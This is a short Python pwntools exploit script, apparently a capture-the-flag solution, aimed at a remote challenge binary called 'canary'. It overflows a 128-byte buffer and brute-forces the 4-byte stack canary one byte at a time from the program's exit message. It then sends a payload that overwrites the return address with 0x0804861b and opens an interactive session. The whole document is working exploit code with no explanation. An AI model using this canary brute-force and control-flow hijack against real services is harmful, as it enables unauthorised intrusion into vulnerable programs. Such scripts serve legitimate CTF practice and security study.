from pwn import *
from tqdm import trange

context.binary = './canary'
# io = process('./canary')
io = remote('0.cloud.chals.io', '27190')

def check(canary):
    payload = b'A' * offset + canary
    io.sendlineafter(b'read?', str(len(payload)).encode())
    io.sendlineafter(b'bytes of data', payload)
    io.recvuntil(b'Exiting...\n')
    # 正常終了かどうか
    res = io.recvline()
    # print(canary.hex(), res)
    return b'successfully!' in res

offset = 128
canary = b''
while len(canary) < 4:
    for c in trange(256):
        predict = canary + bytes.fromhex(f'{c:02x}')
        if check(predict):
            canary = predict
            print(f'found: {canary}')
            break

payload = b'A' * offset + canary + pack(0x0804861b) * 32
io.sendlineafter(b'read?', str(len(payload)).encode())
io.sendlineafter(b'bytes of data', payload)
io.interactive()
# 0x98646100